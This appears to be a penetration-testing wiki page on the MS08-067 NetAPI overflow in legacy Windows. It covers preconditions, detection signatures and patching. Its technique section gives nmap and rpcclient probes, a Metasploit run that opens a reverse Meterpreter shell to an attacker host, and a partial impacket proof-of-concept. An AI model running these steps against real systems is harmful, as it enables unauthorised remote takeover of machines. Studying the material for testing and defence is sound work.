---
title: MS08-067 NetAPI Buffer Overflow
slug: ms08-067-netapi
---

> **TL;DR:** A path-canonicalisation flaw in `netapi32.dll!NetpwPathCanonicalize` lets an unauthenticated SMB client overflow a stack buffer and gain SYSTEM on pre-patch Windows 2000/XP/2003, made famous by Conficker and the Metasploit `ms08_067_netapi` module.

## What it is
MS08-067 (CVE-2008-4250) is a stack buffer overflow in the Server service's RPC handler for `NetPathCanonicalize`. Crafted UNC paths with parent-directory traversal sequences cause the canonicaliser to write past a fixed-size buffer when collapsing `..\` components. Microsoft shipped an out-of-band patch in October 2008; within months the Conficker worm weaponised it across millions of hosts. It remains the textbook "remote unauth pre-auth SMB RCE" and a baseline for any internal-network triage.

## Preconditions / where it applies
- Windows 2000 SP4, XP SP2/SP3, Server 2003 SP1/SP2 without KB958644
- SMB reachable (TCP 445 or 139 via NBT) and Server service running
- IPC$ share accessible — null session works on 2000/XP, anonymous restrictions break it on 2003 sometimes
- Exploit reliability varies by language pack: target offsets differ for EN, CN, FR builds

## Technique
```bash
# Reconnaissance: is the host vulnerable?
nmap -p 445 --script smb-vuln-ms08-067 10.10.10.4

# Verify SMB null session reach
rpcclient -U "" -N 10.10.10.4 -c "srvinfo"
```

```text
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 > set RHOSTS 10.10.10.4
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.2
msf6 > set TARGET 34          # Windows XP SP3 English
msf6 > exploit
```

```python
# Standalone PoC sketch (offsets per target)
import sys
from impacket.dcerpc.v5 import transport, srvs
trigger = "\\" + "A"*5 + "\\..\\..\\" + "B"*0x20 + shellcode
dce = transport.DCERPCTransportFactory(f"ncacn_np:{tgt}[\\pipe\\browser]").get_dce_rpc()
dce.connect(); dce.bind(srvs.MSRPC_UUID_SRVS)
srvs.hNetrpPathCanonicalize(dce, "\\\\x", trigger, "\\PIPE\\", "", 1)
```

## Detection and defence
- Patch: KB958644 (MS08-067)
- Snort SID 1:14782 / Suricata `NETBIOS SMB DCERPC NetrpPathCanonicalize overflow attempt`
- EDR: `svchost.exe` (hosting `srvsvc`) spawning `cmd.exe` or `rundll32` with no parent UI session
- Disable SMBv1 entirely on legacy hosts; segment 445 at the firewall

## References
- [MSRC MS08-067 advisory](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) — vendor bulletin
- [Metasploit ms08_067_netapi source](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms08_067_netapi.rb) — module internals

See also: [[smb-enum]], [[smb-exec]], [[ms17-010-eternalblue]].
